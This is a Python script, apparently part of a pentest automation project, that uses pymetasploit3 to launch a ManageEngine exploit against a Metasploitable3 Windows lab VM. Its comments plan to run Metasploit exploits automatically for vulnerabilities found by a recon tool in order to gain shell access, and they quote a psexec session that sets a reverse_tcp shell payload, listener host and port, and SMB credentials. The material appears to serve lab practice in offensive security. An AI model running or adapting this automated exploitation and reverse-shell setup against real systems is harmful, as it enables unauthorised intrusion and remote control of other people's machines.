from pymetasploit3.msfrpc import *
import time
import exploits
def main():
    # can use this exploit to get access to metasploitable3 windows vm
    exploits.manageengine_connectionid_write(rhosts="172.28.128.3",
                                    rport="8022",
                                    lhosts="172.28.128.1"
                                    )
    # So the idea is that for each exploit found by traft recon tool
    # (which find all available exploits by doing host discovery,
    # cve vulnerabilities based on service version, and then finds the
    # metasploit exploit for them)
    # we search to see if we have an exploit that is supported for it.
    # If we do, then run it and try to get shell access.

    # Since each exploit has a different requirements, payloads (who itself has its own specific parameters),
    # parameters, we would need to write a function for each one.

    # Some http related exploits require a routepath, directory etc.

    # https://www.offensive-security.com/metasploit-unleashed/exploits/
    # For psexec exploit see how they need all these parameters? These are
    # exploit specific. So we need to write a exploit method for each like I
    # did in exploits.py.
        # msf > use exploit/windows/smb/psexec
        # msf exploit(psexec) > set RHOST 192.168.1.100
        # RHOST => 192.168.1.100
        # msf exploit(psexec) > set PAYLOAD windows/shell/reverse_tcp
        # PAYLOAD => windows/shell/reverse_tcp
        # msf exploit(psexec) > set LHOST 192.168.1.5
        # LHOST => 192.168.1.5
        # msf exploit(psexec) > set LPORT 4444
        # LPORT => 4444
        # msf exploit(psexec) > set SMBUSER victim
        # SMBUSER => victim
        # msf exploit(psexec) > set SMBPASS s3cr3t
        # SMBPASS => s3cr3t
        # msf exploit(psexec) > exploit
if __name__ == '__main__':
    main()
